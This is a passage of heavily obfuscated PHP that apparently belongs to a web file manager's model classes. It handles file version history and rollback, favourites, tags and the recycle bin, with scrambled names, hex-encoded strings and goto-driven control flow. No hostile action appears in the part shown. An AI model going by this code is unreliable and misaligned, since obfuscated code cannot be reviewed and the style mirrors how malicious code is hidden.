$eïÈ»ê¼£ = Model($B½îÀ¢ø¸[1121])->listSearchChildren($e¹Û‡°‰õè, 20000); $eïÈ»ê¼£[] = $e¹Û‡°‰õè . $B½îÀ¢ø¸[361]; $a¯°Õ½Æê‰ = array($B½îÀ¢ø¸[369] => array($B½îÀ¢ø¸[7], $eïÈ»ê¼£)); } $fªÛ¶ÆÒˆ = $this->where($a¯°Õ½Æê‰)->order($B½îÀ¢ø¸[2320])->selectPage(); if ($fªÛ¶ÆÒˆ[$B½îÀ¢ø¸[351]][$B½îÀ¢ø¸[352]] == 0) { $fªÛ¶ÆÒˆ[$B½îÀ¢ø¸[351]][$B½îÀ¢ø¸[352]] = 1; $fªÛ¶ÆÒˆ[$B½îÀ¢ø¸[354]] = array(array($B½îÀ¢ø¸[383] => $e¹Û‡°‰õè, $B½îÀ¢ø¸[2303] => $Cª¢ï‚Ú¼ó[$B½îÀ¢ø¸[463]], $B½îÀ¢ø¸[1432] => $Cª¢ï‚Ú¼ó[$B½îÀ¢ø¸[378]], $B½îÀ¢ø¸[388] => $B½îÀ¢ø¸[2321], $B½îÀ¢ø¸[389] => $Cª¢ï‚Ú¼ó[$B½îÀ¢ø¸[187]], $B½îÀ¢ø¸[1434] => $B½îÀ¢ø¸[33])); } goto c©×İÛÇ®¾; f§¿É”ËÏ: $B½îÀ¢ø¸ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Cª¢ï‚Ú¼ó = Model($B½îÀ¢ø¸[1121])->sourceInfo($e¹Û‡°‰õè); $a¯°Õ½Æê‰ = array($B½îÀ¢ø¸[383] => $e¹Û‡°‰õè); goto F±ñÆÎ˜ë½; c©×İÛÇ®¾: return $this->eventListParse($fªÛ¶ÆÒˆ, $e¹Û‡°‰õè); goto AÏŒ°…í±; AÏŒ°…í±: } private function eventListParse($BõÚù°ÆàÉ, $DÄˆíÆ‡ó) { goto b©Ÿ—Ë¯Á; C¢ÜÄÌò‚Õ: return $BõÚù°ÆàÉ; goto BÚ¶ë´ƒš¥; b­©´‹ÇÛØ: $aµ¢ÇÊ§ßÛ = array_unique($aµ¢ÇÊ§ßÛ); $Aİ„·ÊëŒƒ = array_unique(array_to_keyvalue($F‰„Ç«½Ö¬, $a²«øÆ•´ˆ[33], $a²«øÆ•´ˆ[1441])); $EÇÔ¡‰”‚ä = Model($a²«øÆ•´ˆ[479])->userListInfo($Aİ„·ÊëŒƒ); goto b†÷›çÍå; Aô¹ö•ùÕ×: $FˆèÁË¿Â‚ = array_to_keyvalue($F‰„Ç«½Ö¬, $a²«øÆ•´ˆ[33], $a²«øÆ•´ˆ[2309]); foreach ($F‰„Ç«½Ö¬ as $CµªŒÔÇÄã) { $FŒéŒğÏ° = $CµªŒÔÇÄã[$a²«øÆ•´ˆ[405]]; if ($CµªŒÔÇÄã[$a²«øÆ•´ˆ[29]] == $a²«øÆ•´ˆ[494] && isset($FŒéŒğÏ°[$a²«øÆ•´ˆ[1011]])) { $aµ¢ÇÊ§ßÛ[] = $FŒéŒğÏ°[$a²«øÆ•´ˆ[1011]] . $a²«øÆ•´ˆ[33]; $aµ¢ÇÊ§ßÛ[] = $FŒéŒğÏ°[$a²«øÆ•´ˆ[1012]] . $a²«øÆ•´ˆ[33]; } if ($CµªŒÔÇÄã[$a²«øÆ•´ˆ[29]] == $a²«øÆ•´ˆ[2317] && isset($FŒéŒğÏ°[$a²«øÆ•´ˆ[369]])) { $aµ¢ÇÊ§ßÛ[] = $FŒéŒğÏ°[$a²«øÆ•´ˆ[369]] . $a²«øÆ•´ˆ[33]; } } $aµ¢ÇÊ§ßÛ = array_merge($aµ¢ÇÊ§ßÛ, $FˆèÁË¿Â‚, array($DÄˆíÆ‡ó . $a²«øÆ•´ˆ[33])); goto b­©´‹ÇÛØ; b©Ÿ—Ë¯Á: $a²«øÆ•´ˆ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $F‰„Ç«½Ö¬ = $BõÚù°ÆàÉ[$a²«øÆ•´ˆ[354]]; $aµ¢ÇÊ§ßÛ = array_to_keyvalue($F‰„Ç«½Ö¬, $a²«øÆ•´ˆ[33], $a²«øÆ•´ˆ[369]); goto Aô¹ö•ùÕ×; b†÷›çÍå: $bà’æø•°Õ = Model($a²«øÆ•´ˆ[753])->sourceListInfo($aµ¢ÇÊ§ßÛ, !0); foreach ($F‰„Ç«½Ö¬ as &$CµªŒÔÇÄã) { if ($CµªŒÔÇÄã[$a²«øÆ•´ˆ[29]] == $a²«øÆ•´ˆ[494] && isset($CµªŒÔÇÄã[$a²«øÆ•´ˆ[405]][$a²«øÆ•´ˆ[1011]])) { $CµªŒÔÇÄã[$a²«øÆ•´ˆ[405]][$a²«øÆ•´ˆ[1011]] = $bà’æø•°Õ[$CµªŒÔÇÄã[$a²«øÆ•´ˆ[405]][$a²«øÆ•´ˆ[1011]]]; $CµªŒÔÇÄã[$a²«øÆ•´ˆ[405]][$a²«øÆ•´ˆ[1012]] = $bà’æø•°Õ[$CµªŒÔÇÄã[$a²«øÆ•´ˆ[405]][$a²«øÆ•´ˆ[1012]]]; } if ($CµªŒÔÇÄã[$a²«øÆ•´ˆ[29]] == $a²«øÆ•´ˆ[2317] && isset($CµªŒÔÇÄã[$a²«øÆ•´ˆ[405]][$a²«øÆ•´ˆ[369]])) { $CµªŒÔÇÄã[$a²«øÆ•´ˆ[405]][$a²«øÆ•´ˆ[369]] = $bà’æø•°Õ[$CµªŒÔÇÄã[$a²«øÆ•´ˆ[405]][$a²«øÆ•´ˆ[369]]]; } $CµªŒÔÇÄã[$a²«øÆ•´ˆ[391]] = $bà’æø•°Õ[$CµªŒÔÇÄã[$a²«øÆ•´ˆ[369]]]; $CµªŒÔÇÄã[$a²«øÆ•´ˆ[2322]] = $bà’æø•°Õ[$CµªŒÔÇÄã[$a²«øÆ•´ˆ[2309]]]; if ($CµªŒÔÇÄã[$a²«øÆ•´ˆ[29]] == $a²«øÆ•´ˆ[2078]) { $CµªŒÔÇÄã[$a²«øÆ•´ˆ[2322]] = $CµªŒÔÇÄã[$a²«øÆ•´ˆ[391]]; $CµªŒÔÇÄã[$a²«øÆ•´ˆ[2309]] = $CµªŒÔÇÄã[$a²«øÆ•´ˆ[2322]][$a²«øÆ•´ˆ[369]]; $CµªŒÔÇÄã[$a²«øÆ•´ˆ[391]] = !1; $CµªŒÔÇÄã[$a²«øÆ•´ˆ[369]] = $a²«øÆ•´ˆ[33]; } $CµªŒÔÇÄã[$a²«øÆ•´ˆ[2265]] = $EÇÔ¡‰”‚ä[$CµªŒÔÇÄã[$a²«øÆ•´ˆ[1441]]]; } $BõÚù°ÆàÉ[$a²«øÆ•´ˆ[354]] = $F‰„Ç«½Ö¬; goto C¢ÜÄÌò‚Õ; BÚ¶ë´ƒš¥: } public function removeBySource($F‰Ë–è‚“é) { $bŸÓÇ•Š¼ˆ = array($_SERVER[´Ù×Íå‘ÄõÛ][383] => $F‰Ë–è‚“é); $this->where($bŸÓÇ•Š¼ˆ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\165\x72\x63\x65\137\x68\x69\163\x74\157\162\x79"; public function addHistory($CÃ®µ‚£“’, $fÜ’”ä­ßÅ = '') { $a•ƒ†÷Ü =& $_SERVER[´Ù×Íå‘ÄõÛ]; $EÊšáÏ’å = array($a•ƒ†÷Ü[383] => $CÃ®µ‚£“’[$a•ƒ†÷Ü[369]], $a•ƒ†÷Ü[1432] => isset($CÃ®µ‚£“’[$a•ƒ†÷Ü[379]]) ? $CÃ®µ‚£“’[$a•ƒ†÷Ü[379]] : $CÃ®µ‚£“’[$a•ƒ†÷Ü[378]], $a•ƒ†÷Ü[420] => $CÃ®µ‚£“’[$a•ƒ†÷Ü[419]], $a•ƒ†÷Ü[522] => $CÃ®µ‚£“’[$a•ƒ†÷Ü[77]], $a•ƒ†÷Ü[2323] => $fÜ’”ä­ßÅ); $Açæ¡ÔÓ¿Û = $GLOBALS[$a•ƒ†÷Ü[6]][$a•ƒ†÷Ü[84]][$a•ƒ†÷Ü[2324]]; if ($Açæ¡ÔÓ¿Û > 1) { $this->historyAutoClear($EÊšáÏ’å[$a•ƒ†÷Ü[369]]); $this->add($EÊšáÏ’å); } Model($a•ƒ†÷Ü[2325])->eventFileEdit($CÃ®µ‚£“’[$a•ƒ†÷Ü[369]]); } private function historyAutoClear($BË²ß™Õå) { goto bˆÁ†à×á; eÕñÁ·¾î: $bœ‰•ñÔŠ = $E„ñªŒàéº == $C‘Ïµä¾½³[2327] ? 3 : $eœæ«÷ãî§; if ($eœæ«÷ãî§ <= 1) { $bœ‰•ñÔŠ = 1; } $eÔ‘©ÚêÀ = $bœ‰•ñÔŠ - 1; goto dí½«–Ø¤è; bˆÁ†à×á: $C‘Ïµä¾½³ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $E„ñªŒàéº = Model($C‘Ïµä¾½³[1092])->get($C‘Ïµä¾½³[2326]); $eœæ«÷ãî§ = $GLOBALS[$C‘Ïµä¾½³[6]][$C‘Ïµä¾½³[84]][$C‘Ïµä¾½³[2324]]; goto eÕñÁ·¾î; EÓÃêàğñë: $F ÌÉ“ĞÁô = array($C‘Ïµä¾½³[385] => array($C‘Ïµä¾½³[7], $E÷×›Ö­Û´)); $this->where($F ÌÉ“ĞÁô)->delete(); Model($C‘Ïµä¾½³[422])->remove($dœÛâÇÀé); goto FÚ¥šÌìØÂ; dí½«–Ø¤è: if ($eÔ‘©ÚêÀ >= 500) { return; } $F ÌÉ“ĞÁô = array($C‘Ïµä¾½³[383] => $BË²ß™Õå); $a¸Õ¤‰‘— = $this->field($C‘Ïµä¾½³[2328])->where($F ÌÉ“ĞÁô)->order($C‘Ïµä¾½³[2320])->select(); goto eÖµÄåÄÂä; eÖµÄåÄÂä: if (!$a¸Õ¤‰‘— || $eÔ‘©ÚêÀ >= count($a¸Õ¤‰‘—)) { return; } $E÷×›Ö­Û´ = array_to_keyvalue($a¸Õ¤‰‘—, $C‘Ïµä¾½³[33], $C‘Ïµä¾½³[367]); $E÷×›Ö­Û´ = array_slice($E÷×›Ö­Û´, $eÔ‘©ÚêÀ); goto EàĞÊ¸±¦¡; EàĞÊ¸±¦¡: $dœÛâÇÀé = array_to_keyvalue($a¸Õ¤‰‘—, $C‘Ïµä¾½³[33], $C‘Ïµä¾½³[419]); $dœÛâÇÀé = array_slice($dœÛâÇÀé, $eÔ‘©ÚêÀ); if (!$E÷×›Ö­Û´ || !$dœÛâÇÀé) { return; } goto EÓÃêàğñë; FÚ¥šÌìØÂ: } public function listData($Eä¡¾å»ÁÏ) { goto BÓÛô¡¸İ; BÓÛô¡¸İ: $bÈƒÙà½ßÀ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $E’’¨¦•¯Æ = array($bÈƒÙà½ßÀ[383] => $Eä¡¾å»ÁÏ); $AÔà¢ëù‡¦ = $bÈƒÙà½ßÀ[2329]; goto e¬¾ö‘ãˆï; d×™”‘åÁÅ: $Bœó¬±ï§ = 3; if ($D‡ô’‚»°ƒ == $bÈƒÙà½ßÀ[2327]) { $EêÔµ­Ã²Û[$bÈƒÙà½ßÀ[354]] = array_slice($EêÔµ­Ã²Û[$bÈƒÙà½ßÀ[354]], 0, $Bœó¬±ï§); $EêÔµ­Ã²Û[$bÈƒÙà½ßÀ[351]] = array($bÈƒÙà½ßÀ[2330] => 1, $bÈƒÙà½ßÀ[2331] => 20, $bÈƒÙà½ßÀ[2332] => 1, $bÈƒÙà½ßÀ[2333] => count($EêÔµ­Ã²Û[$bÈƒÙà½ßÀ[354]])); } return $EêÔµ­Ã²Û; goto C…è…¤Â«; e¬¾ö‘ãˆï: $EêÔµ­Ã²Û = $this->field($AÔà¢ëù‡¦)->where($E’’¨¦•¯Æ)->order($bÈƒÙà½ßÀ[2320])->selectPage(); $this->_listAppendUser($EêÔµ­Ã²Û[$bÈƒÙà½ßÀ[354]]); $D‡ô’‚»°ƒ = Model($bÈƒÙà½ßÀ[1092])->get($bÈƒÙà½ßÀ[2326]); goto d×™”‘åÁÅ; C…è…¤Â«: } protected function _listAppendUser(&$F¬èô·ô•¨) { $a¡ÅŒ×ğ„¶ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $FÏÚÕ÷ï¡Ü = array_to_keyvalue($F¬èô·ô•¨, $a¡ÅŒ×ğ„¶[33], $a¡ÅŒ×ğ„¶[1441]); $AñÆ—ŸÓóˆ = Model($a¡ÅŒ×ğ„¶[479])->userListInfo($FÏÚÕ÷ï¡Ü); foreach ($F¬èô·ô•¨ as &$A‹Íæœ–Ï) { $AÛˆãõ ÛÑ = $A‹Íæœ–Ï[$a¡ÅŒ×ğ„¶[1441]]; $A‹Íæœ–Ï[$a¡ÅŒ×ğ„¶[378]] = $AñÆ—ŸÓóˆ[$AÛˆãõ ÛÑ] ? $AñÆ—ŸÓóˆ[$AÛˆãõ ÛÑ] : !1; } } public function fileInfo($C’»ò‘óé) { $CìŠùÂ¤º„ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $b…µ—à¿ ” = $this->tablePrefix; $d­É«Æ½İ¦ = "{$b…µ—à¿ ”}\x69\157\x5f\146\151\x6c\145\x20\x66\x69\154\x65\163\40\157\x6e\40\146\151\154\145\163\56\x66\151\154\x65\111\104\40\x3d\x20\x68\151\163\x74\157\162\x79\x2e\x66\151\154\x65\111\104"; return $this->alias($CìŠùÂ¤º„[2334])->where(array($CìŠùÂ¤º„[385] => $C’»ò‘óé))->join($d­É«Æ½İ¦, $CìŠùÂ¤º„[2335])->find(); } public function removeItem($FÖ»ÚƒÊÁŠ) { $e‰ŸåÆÕæŠ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $eİä–¸©Ÿ± = array($e‰ŸåÆÕæŠ[385] => $FÖ»ÚƒÊÁŠ); $c‡’Î£éæ‚ = $this->where($eİä–¸©Ÿ±)->find(); if ($c‡’Î£éæ‚) { $DÌ°‘çŞç = $this->where($eİä–¸©Ÿ±)->delete(); Model($e‰ŸåÆÕæŠ[422])->remove($c‡’Î£éæ‚[$e‰ŸåÆÕæŠ[419]]); return $DÌ°‘çŞç; } return !1; } public function removeBySource($CÕ—õÕÊ†ñ) { goto b†£ÖÖõ; b†£ÖÖõ: $dÌ¿øğµ„ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$CÕ—õÕÊ†ñ) { return !1; } if (!is_array($CÕ—õÕÊ†ñ)) { $CÕ—õÕÊ†ñ = array($CÕ—õÕÊ†ñ); } goto cÜ«ÑÉ“İò; cÜ«ÑÉ“İò: $f–İéƒ‘÷ß = array($dÌ¿øğµ„[383] => array($dÌ¿øğµ„[7], $CÕ—õÕÊ†ñ)); $Däôí„£ğÀ = $this->field($dÌ¿øğµ„[420])->where($f–İéƒ‘÷ß)->select(); if ($Däôí„£ğÀ) { $this->where($f–İéƒ‘÷ß)->delete(); $b¤˜Ù±òº = array_to_keyvalue($Däôí„£ğÀ, $dÌ¿øğµ„[33], $dÌ¿øğµ„[419]); Model($dÌ¿øğµ„[422])->remove($b¤˜Ù±òº); } goto BØ¹¿î¹£Ø; BØ¹¿î¹£Ø: return !0; goto bÙâªƒšåŠ; bÙâªƒšåŠ: } public function setDetail($FğÈ³—Í¶Ó, $e¾çŠ®ÍÊ×) { $dÃõš„®æĞ =& $_SERVER[´Ù×Íå‘ÄõÛ]; return $this->where(array($dÃõš„®æĞ[385] => $FğÈ³—Í¶Ó))->save(array($dÃõš„®æĞ[2323] => $e¾çŠ®ÍÊ×)); } public function rollbackToItem($cî•ÚÌ‚ƒß, $a®†º‚ÍòÄ) { goto cŒº²ö’; cŒº²ö’: $bÅ÷¢§½Šë =& $_SERVER[´Ù×Íå‘ÄõÛ]; $e‚í¹íùÚã = Model($bÅ÷¢§½Šë[753])->sourceInfo($cî•ÚÌ‚ƒß); $this->addHistory($e‚í¹íùÚã); goto b›–½™±—à; bŠù÷¦¼Ë’: return $this->where(array($bÅ÷¢§½Šë[385] => $a®†º‚ÍòÄ))->delete(); goto DØ•Ú××Êœ; b›–½™±—à: $A•„Î´ñ¸© = $this->find($a®†º‚ÍòÄ); $FºÕ¾éí‹» = array($bÅ÷¢§½Šë[419] => $A•„Î´ñ¸©[$bÅ÷¢§½Šë[419]], $bÅ÷¢§½Šë[77] => $A•„Î´ñ¸©[$bÅ÷¢§½Šë[77]], $bÅ÷¢§½Šë[107] => time(), $bÅ÷¢§½Šë[379] => USER_ID); Model($bÅ÷¢§½Šë[753])->where(array($bÅ÷¢§½Šë[369] => $cî•ÚÌ‚ƒß))->save($FºÕ¾éí‹»); goto bŠù÷¦¼Ë’; DØ•Ú××Êœ: } public function clearSame($bëÃÎ²»Ş) { goto D“Ë®ÛÉÊì; DÓ¦ŒÙ‘Àå: $dŸÔ‚öîÊ = array(); $FÖ¯¤Ğëìº = array(); foreach ($D“òİ¹õÉ as $B¸Û‡ÕŒ¹‹) { if (!$B¸Û‡ÕŒ¹‹ || count($B¸Û‡ÕŒ¹‹) <= 1) { continue; } foreach ($B¸Û‡ÕŒ¹‹ as $FÇ¸ç¨µ–§) { $dŸÔ‚öîÊ[] = $FÇ¸ç¨µ–§[$EÖ»ºÂ¬¹‹[419]]; $FÖ¯¤Ğëìº[] = $FÇ¸ç¨µ–§[$EÖ»ºÂ¬¹‹[367]]; } } goto a‰ìá„øÇß; a‰ìá„øÇß: if (!$FÖ¯¤Ğëìº) { return; } $this->where(array($EÖ»ºÂ¬¹‹[367] => array($EÖ»ºÂ¬¹‹[7], $FÖ¯¤Ğëìº)))->delete(); Model($EÖ»ºÂ¬¹‹[422])->remove($dŸÔ‚öîÊ); goto d“ä´‰¿ÀĞ; D“Ë®ÛÉÊì: $EÖ»ºÂ¬¹‹ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C¬…Îì†Ğ‘ = $this->listData($bëÃÎ²»Ş); $D“òİ¹õÉ = array_to_keyvalue_group($C¬…Îì†Ğ‘, $EÖ»ºÂ¬¹‹[419]); goto DÓ¦ŒÙ‘Àå; d“ä´‰¿ÀĞ: } public function userSpace() { $f‹¯Ê·Ä‘˜ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $eğŒ®·¸ŒÊ = $this->tablePrefix; $cÈ¨‹ïÕå = array($f‹¯Ê·Ä‘˜[1432] => USER_ID); $D ·³øİ“ß = "{$eğŒ®·¸ŒÊ}\x69\x6f\137\x66\x69\154\145\x20\x66\151\154\x65\x73\40\x6f\156\x20\146\x69\154\145\163\56\x66\151\x6c\145\111\x44\x20\x3d\x20\x68\151\163\x74\157\x72\x79\56\146\151\x6c\145\111\104"; return $this->alias($f‹¯Ê·Ä‘˜[2334])->where($cÈ¨‹ïÕå)->join($D ·³øİ“ß, $f‹¯Ê·Ä‘˜[2335])->sum($f‹¯Ê·Ä‘˜[77]); } } goto Eˆ•„õÍ»º; dª¾ª„™ØÁ: class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\165\162\143\x65"; protected $tableMeta = array("\164\141\142\154\145\x4e\141\155\x65" => "\x69\157\x5f\x73\x6f\165\x72\143\x65\x5f\x6d\145\164\141", "\x6d\x65\x74\141\106\x69\x65\154\144" => "\163\157\x75\162\143\145\111\104"); protected $dataAuto = array(array("\155\x6f\144\151\146\171\x54\x69\155\x65", "\164\151\155\145", "\x69\156\x73\145\x72\164", "\x66\x75\x6e\143\164\x69\x6f\x6e"), array("\143\x72\x65\x61\x74\145\x54\151\x6d\145", "\164\x69\155\145", "\x69\x6e\163\145\x72\164", "\x66\x75\156\143\x74\151\157\x6e"), array("\166\x69\145\167\x54\x69\x6d\x65", "\x74\151\155\145", "\x69\156\163\x65\162\164", "\146\x75\x6e\x63\164\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($dƒ…Ò¨Ü®È) { return $this->listSource(array($_SERVER[´Ù×Íå‘ÄõÛ][368] => $dƒ…Ò¨Ü®È)); } public function typeName($d®ÔË å“¡) { static $dâ¿Í’ö‡Œ = array(self::TYPE_SYSTEM => "\x73\x79\163\164\145\155", self::TYPE_USER => "\165\163\x65\162", self::TYPE_GROUP => "\x67\162\157\x75\160"); return $dâ¿Í’ö‡Œ[$d®ÔË å“¡ . $_SERVER[´Ù×Íå‘ÄõÛ][33]]; } public function sourceListInfo($bÒ˜…ÇŠ‚ , $cèæÛ¯ŒØ = false) { goto a…ÍÁƒó¼ˆ; a…ÍÁƒó¼ˆ: $b–¥—Áî§ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bÒ˜…ÇŠ‚  = $bÒ˜…ÇŠ‚  ? $bÒ˜…ÇŠ‚  : array(); $bÒ˜…ÇŠ‚  = array_filter(array_unique($bÒ˜…ÇŠ‚ )); goto a‡äğôÑ¶; aÉÇ„ïÍ¼: return array_to_keyvalue($BÑÇØ¡Ó–¸, $b–¥—Áî§[369]); goto f´ßó‡¤ª–; a‡äğôÑ¶: if (!$bÒ˜…ÇŠ‚ ) { return array(); } $BÑÇØ¡Ó–¸ = $this->where(array($b–¥—Áî§[369] => array($b–¥—Áî§[7], $bÒ˜…ÇŠ‚ )))->select(); $this->_listDataApply($BÑÇØ¡Ó–¸, $cèæÛ¯ŒØ); goto aÉÇ„ïÍ¼; f´ßó‡¤ª–: } public function pathInfoFilter($cÇĞàÓõæè) { goto C¹¤›ì†ÁÈ; DˆĞôË²êï: $c§Ÿ‡¿‡ø .= $FÜÅ½‹”ˆ[374]; $c§Ÿ‡¿‡ø .= $FÜÅ½‹”ˆ[375]; $A¤á¢›˜ä = explode($FÜÅ½‹”ˆ[47], $c§Ÿ‡¿‡ø); goto C²ÊŠÒ¤á¥; C¹¤›ì†ÁÈ: $FÜÅ½‹”ˆ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $cÇĞàÓõæè[$FÜÅ½‹”ˆ[75]] = KodIO::make($cÇĞàÓõæè[$FÜÅ½‹”ˆ[369]]); $cÇĞàÓõæè[$FÜÅ½‹”ˆ[29]] = $cÇĞàÓõæè[$FÜÅ½‹”ˆ[370]] == 1 ? $FÜÅ½‹”ˆ[76] : $FÜÅ½‹”ˆ[167]; goto F²‘í´‡Î; C²ÊŠÒ¤á¥: if (isset($cÇĞàÓõæè[$FÜÅ½‹”ˆ[376]]) && $cÇĞàÓõæè[$FÜÅ½‹”ˆ[376]][$FÜÅ½‹”ˆ[377]] == -1) { $A¤á¢›˜ä = array_remove_value($A¤á¢›˜ä, $FÜÅ½‹”ˆ[187]); $A¤á¢›˜ä = array_remove_value($A¤á¢›˜ä, $FÜÅ½‹”ˆ[107]); $A¤á¢›˜ä = array_remove_value($A¤á¢›˜ä, $FÜÅ½‹”ˆ[378]); $A¤á¢›˜ä = array_remove_value($A¤á¢›˜ä, $FÜÅ½‹”ˆ[379]); $A¤á¢›˜ä = array_remove_value($A¤á¢›˜ä, $FÜÅ½‹”ˆ[77]); $A¤á¢›˜ä = array_remove_value($A¤á¢›˜ä, $FÜÅ½‹”ˆ[380]); } $cÇĞàÓõæè = array_field_key($cÇĞàÓõæè, $A¤á¢›˜ä); return $cÇĞàÓõæè; goto Fš±Ì†‚Š; F²‘í´‡Î: $cÇĞàÓõæè[$FÜÅ½‹”ˆ[371]] = $this->typeName($cÇĞàÓõæè[$FÜÅ½‹”ˆ[371]]); if ($cÇĞàÓõæè[$FÜÅ½‹”ˆ[370]] != 1) { $cÇĞàÓõæè[$FÜÅ½‹”ˆ[160]] = $cÇĞàÓõæè[$FÜÅ½‹”ˆ[372]]; unset($cÇĞàÓõæè[$FÜÅ½‹”ˆ[372]]); } $c§Ÿ‡¿‡ø = $FÜÅ½‹”ˆ[373]; goto DˆĞôË²êï; Fš±Ì†‚Š: } public function listUserFav() { goto fšñŒøÃƒ²; A¨ğİš¨³: foreach ($c„‹—ùå‘Œ as &$d½õÖ’Ä¥¾) { $d½õÖ’Ä¥¾ = array($FÌ³ŸÃŸ’[385] => $d½õÖ’Ä¥¾[$FÌ³ŸÃŸ’[367]], $FÌ³ŸÃŸ’[386] => $d½õÖ’Ä¥¾[$FÌ³ŸÃŸ’[28]], $FÌ³ŸÃŸ’[387] => $d½õÖ’Ä¥¾[$FÌ³ŸÃŸ’[75]], $FÌ³ŸÃŸ’[388] => $d½õÖ’Ä¥¾[$FÌ³ŸÃŸ’[29]], $FÌ³ŸÃŸ’[389] => $d½õÖ’Ä¥¾[$FÌ³ŸÃŸ’[187]], $FÌ³ŸÃŸ’[390] => $d½õÖ’Ä¥¾[$FÌ³ŸÃŸ’[107]]); if ($d½õÖ’Ä¥¾[$FÌ³ŸÃŸ’[29]] == $FÌ³ŸÃŸ’[382] && $dß²¦¤Õ’¤[$d½õÖ’Ä¥¾[$FÌ³ŸÃŸ’[75]]]) { $d½õÖ’Ä¥¾[$FÌ³ŸÃŸ’[391]] = $dß²¦¤Õ’¤[$d½õÖ’Ä¥¾[$FÌ³ŸÃŸ’[75]]]; } } return $c„‹—ùå‘Œ; goto aù¥½‡¿°é; fšñŒøÃƒ²: $FÌ³ŸÃŸ’ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $c„‹—ùå‘Œ = Model($FÌ³ŸÃŸ’[381])->listData(); $F¦•Ìªô±½ = array_filter_by_field($c„‹—ùå‘Œ, $FÌ³ŸÃŸ’[29], $FÌ³ŸÃŸ’[382]); goto D×é¸ö…•ƒ; D×é¸ö…•ƒ: $F¦•Ìªô±½ = array_to_keyvalue($F¦•Ìªô±½, $FÌ³ŸÃŸ’[33], $FÌ³ŸÃŸ’[75]); if ($F¦•Ìªô±½) { $dß²¦¤Õ’¤ = $this->listSource(array($FÌ³ŸÃŸ’[383] => array($FÌ³ŸÃŸ’[384], $F¦•Ìªô±½))); } $dß²¦¤Õ’¤ = array_to_keyvalue($dß²¦¤Õ’¤[$FÌ³ŸÃŸ’[354]], $FÌ³ŸÃŸ’[369]); goto A¨ğİš¨³; aù¥½‡¿°é: } public function listUserTag($có„ÁÁ÷Í¯) { goto C„¹ÄØŠçË; C„¹ÄØŠçË: $E±ô¹òØĞ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($có„ÁÁ÷Í¯ && !is_array($có„ÁÁ÷Í¯)) { $có„ÁÁ÷Í¯ = array($có„ÁÁ÷Í¯); } $E®ê®½´± = Model($E±ô¹òØĞ[392])->listData(); goto eºÃ˜õÉÊ‚; bğíé†¨¶Ó: if (!$b”ºÕ‹õô || count($FÓî¥Ê…À) == $b”ºÕ‹õô[$E±ô¹òØĞ[351]][$E±ô¹òØĞ[352]]) { return $b”ºÕ‹õô; } $FÄö‰¹½Ú = array(); $bË¢îôĞíŒ = array_to_keyvalue($b”ºÕ‹õô[$E±ô¹òØĞ[74]], $E±ô¹òØĞ[33], $E±ô¹òØĞ[369]); goto C›ÊÅØÌ‡‡; D‡ŒÀ¶õÚ—: foreach ($c‚¾±¤äÁ as $E‡ã’ù¡‰Æ => $aÃì…Øà) { $bÕ»Š†³ç¢ = !0; if (!$có„ÁÁ÷Í¯) { $FÓî¥Ê…À[] = $E‡ã’ù¡‰Æ; continue; } foreach ($có„ÁÁ÷Í¯ as $bÄÁšÅêƒÏ) { if (!in_array($bÄÁšÅêƒÏ, $aÃì…Øà)) { $bÕ»Š†³ç¢ = !1; break; } } if ($bÕ»Š†³ç¢) { $FÓî¥Ê…À[] = $E‡ã’ù¡‰Æ; } } if (!$FÓî¥Ê…À) { return array(); } $b”ºÕ‹õô = $this->listSource(array($E±ô¹òØĞ[383] => array($E±ô¹òØĞ[384], $FÓî¥Ê…À))); goto bğíé†¨¶Ó; eºÃ˜õÉÊ‚: $c‚¾±¤äÁ = array(); foreach ($E®ê®½´± as $AÉÚÌ‰Å»°) { $F¾ÃÆÎ¦ ¢ = $AÉÚÌ‰Å»°[$E±ô¹òØĞ[75]]; if (!$F¾ÃÆÎ¦ ¢) { continue; } if (!isset($c‚¾±¤äÁ[$F¾ÃÆÎ¦ ¢])) { $c‚¾±¤äÁ[$F¾ÃÆÎ¦ ¢] = array(); } $c‚¾±¤äÁ[$F¾ÃÆÎ¦ ¢][] = $AÉÚÌ‰Å»°[$E±ô¹òØĞ[393]]; } $FÓî¥Ê…À = array(); goto D‡ŒÀ¶õÚ—; C›ÊÅØÌ‡‡: $eÔĞÏ¤²Ğ = array_to_keyvalue($b”ºÕ‹õô[$E±ô¹òØĞ[73]], $E±ô¹òØĞ[33], $E±ô¹òØĞ[369]); $dƒßÆò¥¨Î = array_merge($eÔĞÏ¤²Ğ, $bË¢îôĞíŒ); foreach ($FÓî¥Ê…À as $F¾ÃÆÎ¦ ¢) { if (!in_array($F¾ÃÆÎ¦ ¢, $dƒßÆò¥¨Î)) { $FÄö‰¹½Ú[] = $F¾ÃÆÎ¦ ¢; } } goto D¬‘š«Ô·ƒ; D¬‘š«Ô·ƒ: if ($FÄö‰¹½Ú) { Model($E±ô¹òØĞ[394])->removeBySource($FÄö‰¹½Ú); } return $b”ºÕ‹õô; goto a‘ï½­·; a‘ï½­·: } public function listUserRecycle() { $bèÍ…Üã« =& $_SERVER[´Ù×Íå‘ÄõÛ]; $f´‘ö»Ó±š = Model($bèÍ…Üã«[395])->listData(); if (!$f´‘ö»Ó±š) { return array(); } $FØòÙ’·Ö³ = array($bèÍ…Üã«[383] => array($bèÍ…Üã«[384], $f´‘ö»Ó±š), $bèÍ…Üã«[396] => 1); return $this->listSource($FØòÙ’·Ö³); } public function listSource($Eì ’‘ŠöÒ, $fÔˆŸŠŒÛ = 3000) { goto f‘î¿óñâŒ; f‘î¿óñâŒ: $A‚‡È¿ïÅÈ =& 